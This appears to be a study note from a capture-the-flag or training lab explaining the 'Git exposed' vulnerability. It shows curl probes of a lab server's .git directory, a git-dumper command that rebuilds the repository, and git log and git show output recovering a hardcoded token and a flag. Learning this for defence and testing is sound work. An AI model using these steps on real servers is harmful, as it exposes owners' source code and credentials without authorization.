# 03.git-exposed-attack

04/05/25

## **Recall**

- What is Git?
- What is Git exposed?
- How to test for Git exposed?
- How to gain access to source code?

## **Notes**

### What it is

**Git** is a widely used version control system for managing source code. During development, the `.git/` directory stores the **entire history** of the repository, including previous versions, commit messages, branches, and potentially sensitive data such as credentials or API keys.

**Git exposed** occurs when the `.git/` directory is **accessible in a production environment**, allowing attackers to reconstruct the repository and gain access to sensitive information such as the source code, credentials, or even third-party service connections.

### How to identify it

You can test for Git exposure by manually sending requests to `.git/` and checking for accessible files:

```bash
curl http://10.10.0.6/.git            # 301 Moved Permanently
curl http://10.10.0.6/.git/HEAD       # ref: refs/heads/master
```

If responses return `200 OK` and the content matches expected Git metadata, the repository is likely exposed and exploitable.

### How to exploit it

To exploit a Git exposed vulnerability, an attacker downloads all available `.git/` files and reconstructs the repository locally. Tools like **git-dumper** automate this process:

```bash
git-dumper http://10.10.0.6/ git-exposed
```

Example output:

```bash
[-] Testing http://10.10.0.6/.git/HEAD [200]
[-] Testing http://10.10.0.6/.git/ [403]
[-] Fetching common files
[-] Fetching http://10.10.0.6/.git/COMMIT_EDITMSG [200]
[-] Fetching http://10.10.0.6/.gitignore [200]
[-] Fetching http://10.10.0.6/.git/description [200]
[-] http://10.10.0.6/.gitignore responded with HTML
[...]
```

With the local repository rebuilt, the attacker gains full access to the source code and commit history:

```bash
cat git-exposed/index.php
```

```php
<?php 
	if(isset($_GET['token']) and !empty($_GET['token'])){
	    if($_GET['token'] == "Sup3rAdm1nT0k3n"){
	        echo "Get the flag: [REDACTED]";
	    }else{
	        echo "Token errado :p";   
	    }
	}
?>

<br>

<center>
	<form action="/" method="get" style="width: 70%">
	
	    <input type="text" name="token" placeholder="Digite o token de acesso">
	    <br>
	    <br>
	    <input type="submit" value="Enviar token de acesso">
	</form>
</center>
```

Accessing commit logs and changes:

```bash
git log
```

```bash
commit 7eb5abd9b86eae8e1cf2c808ebb3220286374337 (HEAD -> master)
Author: ... <...>
Date:   Fri Sep 3 12:11:08 2021 -0300

    Removendo flag
```

Accessing commit changes

```bash
git show 7eb5abd9b86eae8e1cf2c808ebb3220286374337
```

```bash

-   echo "Get the flag: CS{G1t_3Xp0s3d_4tt4ck}";
+   echo "Get the flag: [REDACTED]";
```

## **Summary**

Git exposed is a vulnerability caused by misconfigured deployments where the `.git/` directory, meant for version control during development, is left accessible on a production server. This exposure allows attackers to retrieve the entire contents of the Git repository, including source code, secrets, and commit history. By reconstructing the repository locally, an attacker can compromise the integrity and confidentiality of the application and potentially any external services it communicates with. The root of this issue lies in the unintentional reflection of internal development artifacts to the public-facing surface of the application.